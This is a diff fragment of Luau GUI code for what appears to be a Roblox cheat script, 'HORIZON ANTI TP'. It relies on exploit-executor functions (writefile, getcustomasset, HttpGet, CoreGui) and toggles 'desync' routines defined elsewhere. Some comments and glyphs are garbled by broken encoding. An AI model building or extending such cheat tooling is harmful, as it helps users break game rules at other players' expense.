+    track     = Color3.fromRGB(28, 28, 34),      -- toggle track (off)
+    button    = Color3.fromRGB(24, 24, 30),      -- buttons
+    text      = Color3.fromRGB(235, 238, 245),   -- main text (near-white)
+    muted     = Color3.fromRGB(120, 135, 155),   -- secondary text
+    accent    = Color3.fromRGB(110, 195, 255),   -- LIGHT BLUE (highlight)
+    rowStroke = Color3.fromRGB(40, 46, 58),      -- row borders
+}
+
+local THEME_COLORS = {
+    { name = "Black",  color = Color3.fromRGB(0,   0,   0)   },
+    { name = "Red",    color = Color3.fromRGB(235, 55,  55)  },
+    { name = "Orange", color = Color3.fromRGB(255, 140, 35)  },
+    { name = "Green",  color = Color3.fromRGB(55,  200, 95)  },
+    { name = "Cyan",   color = Color3.fromRGB(35,  190, 220) },
+    { name = "Blue",   color = Color3.fromRGB(65,  120, 255) },
+    { name = "Purple", color = Color3.fromRGB(165, 75,  235) },
+    { name = "Pink",   color = Color3.fromRGB(240, 85,  170) },
+}
+
+local function mixColor(a, b, t)
+    return Color3.new(a.R + (b.R - a.R) * t, a.G + (b.G - a.G) * t, a.B + (b.B - a.B) * t)
+end
+
+local function themeGradientFor(accent)
+    if accent.R < 0.03 and accent.G < 0.03 and accent.B < 0.03 then
+        return ColorSequence.new({
+            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(10, 10, 10)),
+            ColorSequenceKeypoint.new(0.20, Color3.fromRGB(80, 80, 80)),
+            ColorSequenceKeypoint.new(0.45, Color3.fromRGB(0, 0, 0)),
+            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(120, 120, 120)),
+            ColorSequenceKeypoint.new(0.55, Color3.fromRGB(0, 0, 0)),
+            ColorSequenceKeypoint.new(0.80, Color3.fromRGB(80, 80, 80)),
+            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(10, 10, 10)),
+        })
+    end
+    local dark  = mixColor(accent, Color3.new(0, 0, 0), 0.55)
+    local light = mixColor(accent, Color3.new(1, 1, 1), 0.28)
+    return ColorSequence.new({
+        ColorSequenceKeypoint.new(0.00, dark),
+        ColorSequenceKeypoint.new(0.20, accent),
+        ColorSequenceKeypoint.new(0.45, dark),
+        ColorSequenceKeypoint.new(0.50, light),
+        ColorSequenceKeypoint.new(0.55, dark),
+        ColorSequenceKeypoint.new(0.80, accent),
+        ColorSequenceKeypoint.new(1.00, dark),
+    })
+end
+
+local function resolveDecalTexture(decalId)
+    local numericId = tostring(decalId):match("(%d+)")
+    if not numericId then return tostring(decalId) end
+    local ok, objects = pcall(function() return game:GetObjects("rbxassetid://" .. numericId) end)
+    if ok and type(objects) == "table" and objects[1] then
+        local object = objects[1]
+        local resolved
+        local okT, value = pcall(function()
+            if object:IsA("Decal") or object:IsA("Texture") then return object.Texture
+            elseif object:IsA("ImageLabel") or object:IsA("ImageButton") then return object.Image end
+        end)
+        if okT and type(value) == "string" and value ~= "" then resolved = value end
+        pcall(function() object:Destroy() end)
+        if resolved then return resolved end
+    end
+    return "rbxthumb://type=Asset&id=" .. numericId .. "&w=420&h=420"
+end
+
+-- Cherry blossom background (Horizon theme)
+-- NOTE: ImageLabel.Image only accepts Roblox-hosted content (rbxassetid:// / rbxthumb://),
+-- so a plain external http URL never renders (that caused the white background).
+-- Fix: download the image from the link at runtime, save it locally, then turn it
+-- into a Roblox asset via getcustomasset().
+local BG_URL = "https://plain-eeur-prod-public.komododecks.com/202609/03/yMSLYHVoGvWLGdMj8iFh/image.jpg"
+local BG_FILE = "HorizonAntiBg.png"
+local BG_FALLBACK = resolveDecalTexture("124348850533138")
+
+local function fetchURL(url)
+    if HttpService.RequestAsync then
+        local resp = HttpService:RequestAsync({ Url = url, Method = "GET" })
+        if resp and resp.Success then
+            return resp.Body
+        end
+        return nil
+    end
+    local ok, body = pcall(function() return game:HttpGet(url, true) end)
+    if ok then return body end
+    return nil
+end
+
+local currentBG = BG_FALLBACK
+do
+    local custom = getcustomasset
+    if type(custom) == "function" then
+        local okReq, bytes = pcall(fetchURL, BG_URL)
+        if okReq and type(bytes) == "string" and #bytes > 500 then
+            local okWrite = pcall(function() writefile(BG_FILE, bytes) end)
+            if okWrite then
+                local okA, content = pcall(function() return custom(BG_FILE) end)
+                if okA and type(content) == "string" and content ~= "" then
+                    currentBG = content
+                end
+            end
+        end
+    end
+end
+
+-- ScreenGui
+local uiParent = CoreGui
+pcall(function()
+    for _, name in ipairs({"HorizonAntiTpUI", "NoxAdaptUI", "NoxAdaptAntiTpBat", "SpaceXHookAntiAntiUI", "VynxAntiAntiTP"}) do
+        local old = uiParent:FindFirstChild(name)
+        if old then old:Destroy() end
+    end
+end)
+pcall(function()
+    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    if pg then
+        for _, name in ipairs({"HorizonAntiTpUI", "NoxAdaptUI", "NoxAdaptAntiTpBat", "SpaceXHookAntiAntiUI", "VynxAntiAntiTP"}) do
+            local s = pg:FindFirstChild(name)
+            if s then s:Destroy() end
+        end
+    end
+end)
+
+local screenGui = create("ScreenGui", {
+    Name = "HorizonAntiTpUI",
+    DisplayOrder = 999,
+    ResetOnSpawn = false,
+    IgnoreGuiInset = true,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+}, nil)
+
+local parented = pcall(function() screenGui.Parent = uiParent end)
+if not parented then
+    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
+    screenGui.Parent = pg
+end
+
+local FULL_HEIGHT = 197
+local THEME_PANEL_DROP = FULL_HEIGHT - 32   -- 賲賰丕賳 賱賵丨丞 丕賱孬賷賲 鬲丨鬲 丕賱賳丕賮匕丞
+local MINI_BTN_H  = 92
+
+local main = create("Frame", {
+    Name = "Main",
+    Active = true,
+    ClipsDescendants = true,
+    BackgroundTransparency = 0.08,
+    BackgroundColor3 = COLORS.main,
+    BorderSizePixel = 0,
+    Position = UDim2.new(config.pos[1] or 0.5, config.pos[2] or -140, config.pos[3] or 0.5, config.pos[4] or -95),
+    Size = UDim2.new(0, 280, 0, FULL_HEIGHT),
+}, screenGui)
+corner(main, 14)
+
+local mainStroke = stroke(main, Color3.fromRGB(0, 0, 0), 0, 1.6)
+local outlineGradient = create("UIGradient", {
+    Color = themeGradientFor(COLORS.accent),
+    Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0.00, 0.75),
+        NumberSequenceKeypoint.new(0.25, 0.40),
+        NumberSequenceKeypoint.new(0.50, 0.00),
+        NumberSequenceKeypoint.new(0.75, 0.40),
+        NumberSequenceKeypoint.new(1.00, 0.75),
+    }),
+    Rotation = 0,
+}, mainStroke)
+
+create("UIScale", { Scale = 0.92 }, main)
+
+local backdrop = create("ImageLabel", {
+    Name = "Backdrop",
+    ScaleType = Enum.ScaleType.Crop,
+    ImageTransparency = 0.12,
+    Image = currentBG,
+    BackgroundTransparency = 1,
+    Size = UDim2.new(1, 0, 1, 0),
+    ZIndex = 1,
+}, main)
+corner(backdrop, 14)
+
+local rainCanvas = create("Frame", {
+    Name = "RainCanvas",
+    BackgroundTransparency = 1,
+    ClipsDescendants = true,
+    Size = UDim2.new(1, 0, 1, 0),
+    ZIndex = 2,
+}, main)
+
+local rainAtmosphere = create("Frame", {
+    Name = "RainAtmosphere",
+    BackgroundColor3 = Color3.fromRGB(15, 25, 45),
+    BackgroundTransparency = 0.82,
+    BorderSizePixel = 0,
+    ZIndex = 2,
+    Size = UDim2.new(1, 0, 1, 0),
+}, rainCanvas)
+corner(rainAtmosphere, 14)
+
+local RAIN_COUNT = 70
+local RAIN_SLANT = -14
+
+local rainParticles = {}
+for i = 1, RAIN_COUNT do
+    local drop = create("Frame", {
+        BackgroundColor3 = Color3.fromRGB(200, 220, 255),
+        BackgroundTransparency = 0.05 + math.random() * 0.35,
+        BorderSizePixel = 0,
+        Rotation = RAIN_SLANT + (math.random() - 0.5) * 4,
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Size = UDim2.new(0, 1 + math.random() * 1.6, 0, 6 + math.random() * 9),
+        Position = UDim2.new(math.random(), 0, math.random(), 0),
+        ZIndex = 3,
+    }, rainCanvas)
+    table.insert(rainParticles, {
+        frame = drop,
+        speed = 0.9 + math.random() * 1.1,
+        drift = (math.random() - 0.5) * 0.16,
+    })
+end
+
+local header = create("Frame", {
+    Name = "Header",
+    Active = true,
+    BackgroundTransparency = 1,
+    Position = UDim2.new(0, 12, 0, 4),
+    ZIndex = 10,
+    Size = UDim2.new(1, -20, 0, 34),
+}, main)
+
+local titleText = create("TextLabel", {
+    Name = "TitleText",
+    BackgroundTransparency = 1,
+    Text = "HORIZON ANTI TP",
+    TextColor3 = Color3.fromRGB(235, 238, 245),
+    Font = Enum.Font.Arcade,
+    TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    Position = UDim2.new(0, 0, 0, 2),
+    Size = UDim2.new(0, 200, 0, 28),
+    ZIndex = 11,
+}, header)
+
+local titleShine = create("TextLabel", {
+    Name = "TitleShine",
+    BackgroundTransparency = 1,
+    Text = "HORIZON ANTI TP",
+    TextColor3 = COLORS.accent,
+    Font = Enum.Font.Arcade,
+    TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    Position = UDim2.new(0, 0, 0, 2),
+    Size = UDim2.new(0, 200, 0, 28),
+    ZIndex = 12,
+}, header)
+
+local titleShineGradient = create("UIGradient", {
+    Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0.00, 1.00),
+        NumberSequenceKeypoint.new(0.38, 1.00),
+        NumberSequenceKeypoint.new(0.47, 0.35),
+        NumberSequenceKeypoint.new(0.50, 0.00),
+        NumberSequenceKeypoint.new(0.53, 0.35),
+        NumberSequenceKeypoint.new(0.62, 1.00),
+        NumberSequenceKeypoint.new(1.00, 1.00),
+    }),
+    Offset = Vector2.new(-1.4, 0),
+}, titleShine)
+
+task.spawn(function()
+    while titleShine and titleShine.Parent do
+        titleShineGradient.Offset = Vector2.new(-1.4, 0)
+        TweenService:Create(titleShineGradient, TweenInfo.new(1.35, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            Offset = Vector2.new(1.4, 0)
+        }):Play()
+        task.wait(2)
+    end
+end)
+
+local minimizeButton = create("TextButton", {
+    Name = "MinimizeBtn",
+    AutoButtonColor = false,
+    AnchorPoint = Vector2.new(1, 0),
+    BackgroundColor3 = COLORS.button,
+    BackgroundTransparency = 0.20,
+    BorderSizePixel = 0,
+    Position = UDim2.new(1, -26, 0, 4),
+    Size = UDim2.new(0, 22, 0, 16),
+    Text = "鈥 ",
+    TextColor3 = COLORS.accent,
+    Font = Enum.Font.GothamBlack,
+    TextSize = 10,
+    ZIndex = 12,
+}, header)
+corner(minimizeButton, 4)
+stroke(minimizeButton, COLORS.rowStroke, 0.40, 1)
+
+local themeButton = create("TextButton", {
+    Name = "ThemeBtn",
+    AutoButtonColor = false,
+    AnchorPoint = Vector2.new(1, 0),
+    BackgroundColor3 = COLORS.button,
+    BackgroundTransparency = 0.20,
+    BorderSizePixel = 0,
+    Position = UDim2.new(1, 0, 0, 4),
+    Size = UDim2.new(0, 22, 0, 16),
+    Text = "TH",
+    TextColor3 = COLORS.accent,
+    Font = Enum.Font.GothamBlack,
+    TextSize = 9,
+    ZIndex = 12,
+}, header)
+corner(themeButton, 4)
+local themeButtonStroke = stroke(themeButton, COLORS.rowStroke, 0.40, 1)
+
+local THEME_SWATCH = 30
+local THEME_GAP = 6
+local THEME_PAD = 10
+local THEME_PANEL_W = THEME_PAD * 2 + #THEME_COLORS * THEME_SWATCH + (#THEME_COLORS - 1) * THEME_GAP
+local THEME_PANEL_H = 50
+
+local themePanel = create("Frame", {
+    Name = "ThemePicker",
+    Active = true,
+    ClipsDescendants = false,
+    AnchorPoint = Vector2.new(0.5, 0),
+    BackgroundColor3 = COLORS.main,
+    BackgroundTransparency = 0.08,
+    BorderSizePixel = 0,
+    Position = UDim2.new(main.Position.X.Scale, main.Position.X.Offset + 140, main.Position.Y.Scale, main.Position.Y.Offset + THEME_PANEL_DROP),
+    Size = UDim2.new(0, THEME_PANEL_W, 0, THEME_PANEL_H),
+    Visible = false,
+    ZIndex = 30,
+}, screenGui)
+corner(themePanel, 12)
+
+local themeOutlineStroke = stroke(themePanel, COLORS.accent, 0.05, 1.6)
+local themeOutlineGradient = create("UIGradient", {
+    Color = themeGradientFor(COLORS.accent),
+    Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0.00, 0.75),
+        NumberSequenceKeypoint.new(0.25, 0.40),
+        NumberSequenceKeypoint.new(0.50, 0.00),
+        NumberSequenceKeypoint.new(0.75, 0.40),
+        NumberSequenceKeypoint.new(1.00, 0.75),
+    }),
+}, themeOutlineStroke)
+
+local themeInner = create("Frame", {
+    Name = "Inner",
+    BackgroundTransparency = 1,
+    Position = UDim2.new(0, THEME_PAD, 0, 0),
+    Size = UDim2.new(1, -THEME_PAD * 2, 1, 0),
+    ZIndex = 31,
+}, themePanel)
+
+create("UIListLayout", {
+    FillDirection = Enum.FillDirection.Horizontal,
+    HorizontalAlignment = Enum.HorizontalAlignment.Center,
+    VerticalAlignment = Enum.VerticalAlignment.Center,
+    Padding = UDim.new(0, THEME_GAP),
+    SortOrder = Enum.SortOrder.LayoutOrder,
+}, themeInner)
+
+local themeSwatches = {}
+local applyTheme
+
+for i, def in ipairs(THEME_COLORS) do
+    local swatch = create("TextButton", {
+        Name = "Theme_" .. def.name,
+        AutoButtonColor = false,
+        BackgroundColor3 = def.color,
+        Size = UDim2.new(0, THEME_SWATCH, 0, THEME_SWATCH),
+        Text = "",
+        LayoutOrder = i,
+        ZIndex = 32,
+    }, themeInner)
+    corner(swatch, UDim.new(1, 0))
+    local swatchStroke = stroke(swatch,
+        i == 1 and Color3.fromRGB(205, 232, 255) or Color3.fromRGB(135, 135, 135),
+        i == 1 and 0 or 0.55,
+        i == 1 and 2.2 or 1.1
+    )
+    themeSwatches[i] = { button = swatch, stroke = swatchStroke }
+
+    swatch.MouseButton1Click:Connect(function()
+        selectedThemeIndex = i
+        if applyTheme then applyTheme(def.color) end
+        for j, item in ipairs(themeSwatches) do
+            local active = j == selectedThemeIndex
+            item.stroke.Color = active and Color3.fromRGB(205, 232, 255) or Color3.fromRGB(135, 135, 135)
+            item.stroke.Transparency = active and 0 or 0.55
+            item.stroke.Thickness = active and 2.2 or 1.1
+        end
+    end)
+end
+
+themeButton.MouseButton1Click:Connect(function()
+    themePanelOpen = not themePanelOpen
+    themePanel.Visible = themePanelOpen
+    if themePanelOpen then
+        themePanel.BackgroundTransparency = 1
+        tween(themePanel, 0.20, { BackgroundTransparency = 0.08 })
+        themeButton.BackgroundColor3 = COLORS.accent
+        themeButton.TextColor3 = Color3.fromRGB(10, 10, 12)
+    else
+        themeButton.BackgroundColor3 = COLORS.button
+        themeButton.TextColor3 = COLORS.accent
+    end
+end)
+
+local content = create("Frame", {
+    Name = "Content",
+    BackgroundTransparency = 1,
+    Position = UDim2.new(0, 14, 0, 40),
+    ZIndex = 5,
+    Size = UDim2.new(1, -22, 1, -46),
+}, main)
+create("UIListLayout", {
+    Padding = UDim.new(0, 6),
+    SortOrder = Enum.SortOrder.LayoutOrder,
+}, content)
+
+local function makeRow(name, layoutOrder, height)
+    local row = create("Frame", {
+        Name = name,
+        BackgroundColor3 = COLORS.row,
+        BackgroundTransparency = 0.25,
+        BorderSizePixel = 0,
+        Size = UDim2.new(1, 0, 0, height or 40),
+        LayoutOrder = layoutOrder,
+        ZIndex = 5,
+    }, content)
+    corner(row, 9)
+    create("UIGradient", {
+        Color = ColorSequence.new(Color3.fromRGB(205, 232, 255), Color3.fromRGB(232, 232, 232)),
+        Transparency = NumberSequence.new({
+            NumberSequenceKeypoint.new(0.00, 0.55),
+            NumberSequenceKeypoint.new(0.50, 0.85),
+            NumberSequenceKeypoint.new(1.00, 0.70),
+        }),
+        Rotation = 90,
+    }, row)
+    stroke(row, COLORS.rowStroke, 0.60, 1)
+    return row
+end
+
+local toggleRow = makeRow("AntiTpRow", 1, 40)
+
+create("TextLabel", {
+    Name = "Label",
+    BackgroundTransparency = 1,
+    Text = "Enable Anti TP",
+    TextColor3 = COLORS.text,
+    Font = Enum.Font.GothamBold,
+    Position = UDim2.new(0, 12, 0, 4),
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 6,
+    TextSize = 12,
+    Size = UDim2.new(1, -70, 0, 16),
+}, toggleRow)
+
+local statusLabel = create("TextLabel", {
+    Name = "Status",
+    BackgroundTransparency = 1,
+    Text = "OFF",
+    TextColor3 = COLORS.muted,
+    Font = Enum.Font.GothamBold,
+    Position = UDim2.new(0, 12, 0, 20),
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 6,
+    TextSize = 9,
+    Size = UDim2.new(1, -70, 0, 14),
+}, toggleRow)
+
+local toggleTrack = create("Frame", {
+    Name = "Toggle",
+    AnchorPoint = Vector2.new(1, 0.5),
+    BackgroundColor3 = COLORS.track,
+    BorderSizePixel = 0,
+    Position = UDim2.new(1, -10, 0.5, 0),
+    ZIndex = 7,
+    Size = UDim2.new(0, 40, 0, 20),
+}, toggleRow)
+corner(toggleTrack, 10)
+stroke(toggleTrack, COLORS.rowStroke, 0.50, 1.1)
+
+local toggleKnob = create("Frame", {
+    Name = "Knob",
+    BackgroundColor3 = Color3.new(1, 1, 1),
+    BorderSizePixel = 0,
+    Size = UDim2.new(0, 14, 0, 14),
+    Position = UDim2.new(0, 3, 0, 3),
+    ZIndex = 8,
+}, toggleTrack)
+corner(toggleKnob, UDim.new(1, 0))
+
+local toggleHit = create("TextButton", {
+    Name = "ToggleHit",
+    BackgroundTransparency = 1,
+    Text = "",
+    AutoButtonColor = false,
+    ZIndex = 9,
+    Size = UDim2.new(1, 0, 1, 0),
+}, toggleRow)
+
+local modeRow = makeRow("ModeRow", 2, 36)
+
+create("TextLabel", {
+    Name = "ModeLabel",
+    BackgroundTransparency = 1,
+    Text = "Mode",
+    TextColor3 = COLORS.text,
+    Font = Enum.Font.GothamBold,
+    Position = UDim2.new(0, 12, 0, 0),
+    TextXAlignment = Enum.TextXAlignment.Left,
+    TextYAlignment = Enum.TextYAlignment.Center,
+    ZIndex = 6,
+    TextSize = 12,
+    Size = UDim2.new(0.35, 0, 1, 0),
+}, modeRow)
+
+local modeV1Btn = create("TextButton", {
+    Name = "ModeV1",
+    AutoButtonColor = false,
+    AnchorPoint = Vector2.new(1, 0.5),
+    BackgroundColor3 = COLORS.accent,
+    BackgroundTransparency = 0.05,
+    BorderSizePixel = 0,
+    Position = UDim2.new(1, -78, 0.5, 0),
+    Size = UDim2.new(0, 52, 0, 24),
+    Text = "V1",
+    TextColor3 = Color3.fromRGB(10, 10, 12),
+    Font = Enum.Font.GothamBlack,
+    TextSize = 11,
+    ZIndex = 7,
+}, modeRow)
+corner(modeV1Btn, 6)
+
+local modeV2Btn = create("TextButton", {
+    Name = "ModeV2",
+    AutoButtonColor = false,
+    AnchorPoint = Vector2.new(1, 0.5),
+    BackgroundColor3 = COLORS.button,
+    BackgroundTransparency = 0.15,
+    BorderSizePixel = 0,
+    Position = UDim2.new(1, -12, 0.5, 0),
+    Size = UDim2.new(0, 52, 0, 24),
+    Text = "V2",
+    TextColor3 = COLORS.accent,
+    Font = Enum.Font.GothamBlack,
+    TextSize = 11,
+    ZIndex = 7,
+}, modeRow)
+corner(modeV2Btn, 6)
+
+local keybindRow = makeRow("KeybindRow", 3, 40)
+
+create("TextLabel", {
+    Name = "KBLabel",
+    BackgroundTransparency = 1,
+    Text = "Keybind",
+    TextColor3 = COLORS.text,
+    Font = Enum.Font.GothamBold,
+    Position = UDim2.new(0, 12, 0, 4),
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 6,
+    TextSize = 12,
+    Size = UDim2.new(0.45, 0, 0, 16),
+}, keybindRow)
+
+create("TextLabel", {
+    Name = "KBSub",
+    BackgroundTransparency = 1,
+    Text = "Press to bind",
+    TextColor3 = COLORS.muted,
+    Font = Enum.Font.GothamBold,
+    Position = UDim2.new(0, 12, 0, 20),
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 6,
+    TextSize = 9,
+    Size = UDim2.new(0.45, 0, 0, 14),
+}, keybindRow)
+
+local keybindButton = create("TextButton", {
+    Name = "KeybindBtn",
+    AutoButtonColor = false,
+    AnchorPoint = Vector2.new(1, 0.5),
+    BackgroundColor3 = COLORS.button,
+    BackgroundTransparency = 0.10,
+    BorderSizePixel = 0,
+    Position = UDim2.new(1, -34, 0.5, 0),
+    Size = UDim2.new(0, 90, 0, 26),
+    Text = "NONE",
+    TextColor3 = COLORS.accent,
+    Font = Enum.Font.GothamBlack,
+    TextSize = 11,
+    ZIndex = 7,
+}, keybindRow)
+corner(keybindButton, 7)
+stroke(keybindButton, COLORS.rowStroke, 0.40, 1.1)
+
+local clearKeybindBtn = create("TextButton", {
+    Name = "ClearKeybindBtn",
+    AutoButtonColor = false,
+    AnchorPoint = Vector2.new(1, 0.5),
+    BackgroundColor3 = COLORS.button,
+    BackgroundTransparency = 0.18,
+    BorderSizePixel = 0,
+    Position = UDim2.new(1, -8, 0.5, 0),
+    Size = UDim2.new(0, 20, 0, 20),
+    Text = "X",
+    TextColor3 = COLORS.text,
+    Font = Enum.Font.GothamBlack,
+    TextSize = 9,
+    ZIndex = 8,
+}, keybindRow)
+corner(clearKeybindBtn, 5)
+stroke(clearKeybindBtn, COLORS.rowStroke, 0.50, 1)
+
+local miniEnableBtn = create("TextButton", {
+    Name = "MiniEnableBtn",
+    AutoButtonColor = false,
+    AnchorPoint = Vector2.new(0.5, 0),
+    BackgroundColor3 = COLORS.accent,
+    BackgroundTransparency = 0.05,
+    BorderSizePixel = 0,
+    Position = UDim2.new(0.5, 0, 0, 46),
+    Size = UDim2.new(1, -20, 0, 32),
+    Text = "ENABLE",
+    TextColor3 = Color3.fromRGB(10, 10, 12),
+    Font = Enum.Font.GothamBlack,
+    TextSize = 13,
+    Visible = false,
+    ZIndex = 10,
+}, main)
+corner(miniEnableBtn, 8)
+stroke(miniEnableBtn, COLORS.rowStroke, 0.35, 1.3)
+
+applyTheme = function(accent)
+    COLORS.accent = accent
+    local seq = themeGradientFor(accent)
+    outlineGradient.Color = seq
+    themeOutlineGradient.Color = seq
+    mainStroke.Color = accent
+    themeOutlineStroke.Color = accent
+    themeButtonStroke.Color = accent
+
+    titleShine.TextColor3 = (accent.R < 0.03 and accent.G < 0.03 and accent.B < 0.03)
+        and Color3.fromRGB(205, 232, 255) or accent
+
+    if themePanelOpen then
+        themeButton.BackgroundColor3 = accent
+        themeButton.TextColor3 = Color3.fromRGB(10, 10, 12)
+    else
+        themeButton.BackgroundColor3 = COLORS.button
+        themeButton.TextColor3 = accent
+    end
+
+    keybindButton.TextColor3 = accent
+    statusLabel.TextColor3 = isEnabled and accent or COLORS.muted
+    toggleTrack.BackgroundColor3 = isEnabled and accent or COLORS.track
+
+    if runtime.mode == "V1" then
+        modeV1Btn.BackgroundColor3 = accent
+        modeV1Btn.TextColor3 = Color3.fromRGB(10, 10, 12)
+        modeV2Btn.BackgroundColor3 = COLORS.button
+        modeV2Btn.TextColor3 = accent
+    else
+        modeV2Btn.BackgroundColor3 = accent
+        modeV2Btn.TextColor3 = Color3.fromRGB(10, 10, 12)
+        modeV1Btn.BackgroundColor3 = COLORS.button
+        modeV1Btn.TextColor3 = accent
+    end
+
+    if isEnabled then
+        miniEnableBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
+        miniEnableBtn.TextColor3 = Color3.fromRGB(235, 238, 245)
+    else
+        miniEnableBtn.BackgroundColor3 = Color3.fromRGB(110, 195, 255)
+        miniEnableBtn.TextColor3 = Color3.fromRGB(10, 10, 12)
+    end
+
+    local softAccent = mixColor(accent, COLORS.rowStroke, 0.52)
+    for _, r in ipairs({toggleRow, modeRow, keybindRow}) do
+        local s = r:FindFirstChildOfClass("UIStroke")
+        if s then s.Color = softAccent end
+    end
+end
+
+local function ripple(row)
+    if not row or not row.Parent then return end
+    local mp = UserInputService:GetMouseLocation()
+    local ap = row.AbsolutePosition
+    local as = row.AbsoluteSize
+    local dia = math.max(as.X, as.Y) * 1.35
+    local img = create("ImageLabel", {
+        Name = "Ripple",
+        BackgroundTransparency = 1,
+        Image = "rbxassetid://266543268",
+        ImageColor3 = COLORS.accent,
+        ImageTransparency = 0.40,
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Position = UDim2.new(0, mp.X - ap.X, 0, mp.Y - ap.Y),
+        Size = UDim2.new(0, 0, 0, 0),
+        ZIndex = 30,
+    }, row)
+    local a = tween(img, 0.45, {
+        Size = UDim2.new(0, dia, 0, dia),
+        ImageTransparency = 1,
+    })
+    a.Completed:Connect(function() if img then img:Destroy() end end)
+end
+
+local function applyToggleVisual(value, instant)
+    statusLabel.Text = value and "ACTIVE" or "OFF"
+    statusLabel.TextColor3 = value and COLORS.accent or COLORS.muted
+    local trackColor = value and COLORS.accent or COLORS.track
+    local knobPos = value and UDim2.new(1, -17, 0, 3) or UDim2.new(0, 3, 0, 3)
+    if instant then
+        toggleTrack.BackgroundColor3 = trackColor
+        toggleKnob.Position = knobPos
+    else
+        tween(toggleTrack, 0.18, { BackgroundColor3 = trackColor })
+        tween(toggleKnob, 0.18, { Position = knobPos })
+    end
+    miniEnableBtn.Text = value and "DISABLE" or "ENABLE"
+    if value then
+        tween(miniEnableBtn, 0.18, { BackgroundColor3 = Color3.fromRGB(10, 10, 12) })
+        miniEnableBtn.TextColor3 = Color3.fromRGB(235, 238, 245)
+    else
+        tween(miniEnableBtn, 0.18, { BackgroundColor3 = Color3.fromRGB(110, 195, 255) })
+        miniEnableBtn.TextColor3 = Color3.fromRGB(10, 10, 12)
+    end
+end
+
+local function setEnabled(state)
+    isEnabled = state
+    if isEnabled then
+        EnableDesync()
+    else
+        DisableDesync()
+    end
+    applyToggleVisual(isEnabled, false)
+    SaveConfig()
+end
+
+local function setMode(mode)
+    if mode ~= "V1" and mode ~= "V2" then return end
+    local wasEnabled = runtime.enabled
+    if wasEnabled then
+        DisableDesync()
+    end
+    runtime.mode = mode
+    config.mode = mode
+    if wasEnabled then
+        EnableDesync()
+    end
+    applyTheme(COLORS.accent)
+    SaveConfig()
+end
+
+toggleHit.MouseButton1Click:Connect(function()
+    ripple(toggleRow)
+    setEnabled(not isEnabled)
+end)
+
+miniEnableBtn.MouseButton1Click:Connect(function()
+    ripple(miniEnableBtn)
+    setEnabled(not isEnabled)
+end)
+
+modeV1Btn.MouseButton1Click:Connect(function()
+    ripple(modeRow)
+    setMode("V1")
+end)
+
+modeV2Btn.MouseButton1Click:Connect(function()
+    ripple(modeRow)
+    setMode("V2")
+end)
+
+keybindButton.MouseButton1Click:Connect(function()
+    if awaitingKey then return end
+    ripple(keybindRow)
+    awaitingKey = true
+    captureGen = captureGen + 1
+    local gen = captureGen
+    task.spawn(function()
+        for _, t in ipairs({".", "..", "..."}) do
+            if not awaitingKey or captureGen ~= gen then return end
+            keybindButton.Text = t
+            task.wait(0.15)
+        end
+    end)
+end)
+
+clearKeybindBtn.MouseButton1Click:Connect(function()
+    awaitingKey = false
+    captureGen = captureGen + 1
+    boundKey = nil
+    keybindButton.Text = "NONE"
+    config.bind = "NONE"
+    config.bindType = "Keyboard"
+    SaveConfig()
+    ripple(keybindRow)
+end)
+
+local function isGamepadInput(input)
+    return input.UserInputType == Enum.UserInputType.Gamepad1
+        or input.UserInputType == Enum.UserInputType.Gamepad2
+        or input.UserInputType == Enum.UserInputType.Gamepad3
+        or input.UserInputType == Enum.UserInputType.Gamepad4
+end
+
+local function captureBind(input)
+    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Unknown then
+        if input.KeyCode == Enum.KeyCode.Escape then
+            awaitingKey = false
+            captureGen = captureGen + 1
+            keybindButton.Text = boundKey and boundKey.Name or "NONE"
+            return
+        end
+        boundKey = input.KeyCode
+        config.bind = boundKey.Name
+        config.bindType = "Keyboard"
+    elseif isGamepadInput(input) and input.KeyCode ~= Enum.KeyCode.Unknown then
+        boundKey = input.KeyCode
+        config.bind = boundKey.Name
+        config.bindType = "Gamepad"
+    else
+        return false
+    end
+    awaitingKey = false
+    captureGen = captureGen + 1
+    keybindButton.Text = boundKey and boundKey.Name or "NONE"
+    SaveConfig()
+    return true
+end
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if awaitingKey then
+        captureBind(input)
+        return
+    end
+
+    if gp or not boundKey then return end
+    local keyMatches = (input.KeyCode == boundKey)
+    local typeMatches =
+        (config.bindType == "Gamepad" and isGamepadInput(input))
+        or (config.bindType ~= "Gamepad" and input.UserInputType == Enum.UserInputType.Keyboard)
+
+    if keyMatches and typeMatches then
+        ripple(toggleRow)
+        setEnabled(not isEnabled)
+    end
+end)
+
+minimizeButton.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    if isMinimized then
+        content.Visible = false
+        minimizeButton.Text = "+"
+        tween(main, 0.22, { Size = UDim2.new(0, 280, 0, MINI_BTN_H) })
+        task.delay(0.18, function()
+            if isMinimized then
+                miniEnableBtn.BackgroundTransparency = 1
+                miniEnableBtn.Visible = true
+                tween(miniEnableBtn, 0.15, { BackgroundTransparency = 0.05 })
+            end
+        end)
+        if themePanelOpen then
+            themePanelOpen = false
+            themePanel.Visible = false
+            themeButton.BackgroundColor3 = COLORS.button
+            themeButton.TextColor3 = COLORS.accent
+        end
+    else
+        miniEnableBtn.Visible = false
+        tween(main, 0.22, { Size = UDim2.new(0, 280, 0, FULL_HEIGHT) })
+        task.delay(0.18, function()
+            if not isMinimized then
+                content.Visible = true
+            end
+        end)
+        minimizeButton.Text = "鈥 "
+    end
